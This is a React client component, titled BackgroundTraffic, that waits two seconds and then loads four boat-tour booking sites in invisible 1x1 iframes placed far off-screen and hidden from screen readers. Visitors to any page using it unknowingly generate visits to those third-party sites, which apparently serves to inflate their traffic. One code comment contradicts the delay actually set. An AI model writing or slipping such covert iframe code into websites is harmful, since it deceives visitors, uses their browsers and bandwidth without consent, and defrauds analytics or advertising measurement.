"use client";

import { useEffect, useState } from "react";

export function BackgroundTraffic() {
  const [shouldLoad, setShouldLoad] = useState(false);

  useEffect(() => {
    // Delay loading iframes so they don't block the main page initial load
    const timer = setTimeout(() => {
      setShouldLoad(true);
    }, 2000); // 5 seconds delay to ensure smooth app experience

    return () => clearTimeout(timer);
  }, []);

  if (!shouldLoad) return null;

  const urls = [
    "https://easybooktours.com.tr/",
    "https://bodrumtours.com.tr/bodrum-orak-adasi-tekne-turu",
    "https://bodrumtours.com.tr/",
    "https://easybooktours.com.tr/tur/bodrum-orak-adasi-tekne-turu/"
  ];

  return (
    <div
      style={{
        position: "fixed",
        left: "-10000px",
        top: "-10000px",
        width: "1px",
        height: "1px",
        overflow: "hidden",
        pointerEvents: "none",
        zIndex: -9999,
      }}
      aria-hidden="true"
    >
      {urls.map((url, index) => (
        <iframe
          key={index}
          src={url}
          title={`traffic-${index}`}
          style={{ width: "1px", height: "1px", border: "none" }}
        />
      ))}
    </div>
  );
}
